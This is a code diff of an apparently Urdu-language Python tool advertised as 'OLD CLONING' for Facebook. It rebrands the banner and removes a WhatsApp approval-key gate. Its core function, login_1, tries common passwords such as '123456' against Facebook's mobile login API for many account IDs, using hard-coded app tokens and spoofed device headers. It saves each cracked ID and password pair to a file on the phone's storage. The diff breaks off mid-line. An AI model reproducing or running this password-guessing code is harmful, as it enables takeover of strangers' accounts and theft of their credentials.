@@ -1,32 +1,3 @@
-import uuid, webbrowser
-
-print("=== KHOSA TOOL ===")
-
-# 1. Unique ID banao
-user_id = str(uuid.uuid4())[:8].upper()
-print(f"\nYour Approval ID: {user_id}")
-print("Ye ID WhatsApp pe bhej do approval ke liye\n")
-
-# 2. Auto WhatsApp open
-number = "923163458894"  # tumhara number
-msg = f"Assalamualaikum Bhai%0AApproval Key Chahiye%0AMy ID: {user_id}"
-url = f"https://wa.me/{number}?text={msg}"
-webbrowser.open(url)
-print("WhatsApp auto open ho gaya. ID send kar do.\n")
-
-# 3. Key mango
-key = input("Admin se mili key yahan paste karo: ")
-
-# 4. Key check
-correct_key = "APPROVED_" + user_id
-if key == correct_key:  
-    print("\n✅ Approved! Tool Start ho raha hai...")
-else:
-    print("\n❌ Wrong Key! Sahi key lagao")
-    exit()
-
-print("\nWelcome to Khosa Tool")
-print("----------------------------------\n")
 import os
 import re
 import time
@@ -184,7 +155,7 @@ def window1():
     return random.choice([A, B, C, D])
 
 # Set window title
-sys.stdout.write('\x1b]2;𓆩【A H B 👑 】𓆪 \x07')
+sys.stdout.write('\x1b]2;𓆩【KHOSo 👑 】𓆪 \x07')
 
 # ==========================================
 # 👑 REAL BRANDING BANNER (SCREENSHOT STYLE) 👑
@@ -197,20 +168,28 @@ def show_branding():
     
 
     print("""\033[1;32m
-           ____  __.__                          
-|    |/ _|  |__   ____  ___________   
-|      < |  |  \ /  _ \/  ___/\__  \  
-|    |  \|   Y  (  <_> )___ \  / __ \_
-|____|__ \___|  /\____/____  >(____  /
-        \/    \/           \/      \/    \033[0m""")
+         
+██████████████████████████████████████████████████████████████████████████████
+█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
+█▒▒▄▀▒▒██▒▒▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
+█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
+█▒▒▄▀▒▒██▒▒▄▀▒▒███▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█
+█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
+█▒▒▄▀▄▀▄▀▄▀▄▀▒▒███▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
+█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
+█▒▒▄▀▒▒██▒▒▄▀▒▒███▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█████████▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
+█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
+█▒▒▄▀▒▒██▒▒▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
+█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
+██████████████████████████████████████████████████████████████████████████████\033[0m""")
                
     # 2. پھر اس کے بالکل نیچے آپ کا کلر فل لائنز والا ڈیٹا شو ہوگا
     print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97mKhosa")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mKHOSA-TOOL")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97mKhoso ")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mKHOSO-TOOL")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mWHATSAP    \x1b[38;5;46m▶  \033[1;97m03163458894")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m10.8")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m10.9")
     print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
 
 # پرانے بینر کو اس نئے طریقے پر سیٹ کر دیا تاکہ نیچے پورا اسکرپٹ خود ہی فکس ہو جائے
@@ -395,7 +374,9 @@ def old_Tree():
 def login_1(uid):
     global loop
     session = requests.session()
-        try:
+    try:
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
                 'adid': str(uuid.uuid4()),
@@ -408,7 +389,7 @@ def login_1(uid):
                 'source': 'device_based_login',
                 'email': str(uid),
                 'password': str(pw),
-                'access_token': '350685531728|62f8ce9f74b12f84c123c',
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                 'generate_session_cookies': '1',
                 'meta_inf_fbmeta': '',
                 'advertiser_id': str(uuid.uuid4()),
@@ -417,7 +398,7 @@ def login_1(uid):
                 'client_country_code': 'US',
                 'method': 'auth.login',
                 'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class': 'com.facebook.account.login.',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                 'api_key': '882a8490361da98702bf97a021ddc14d'
             }
             headers = {
@@ -428,20 +409,20 @@ def login_1(uid):
                 'X-FB-SIM-HNI': '29752',
                 'X-FB-Connection-Type': 'MOBILE.LTE',
                 'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiz+yNNBgbwC;pid=Main;tid=1',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                 'x-fb-device-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
                 'X-FB-Client-IP': 'True',
                 'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': 'd29d67d37eca387482a8a5b74'
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
             }
-            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).text
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m|4\x1b[1;37m<OK> \x1b[1;32m{uid} | \x1b[1;32m{pw}")
-                open('/sdcard/AHB-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/khoso-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
-    except:
-        pass
+            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                print(f"\r\r\x1b[1;37m\x1b[38;5
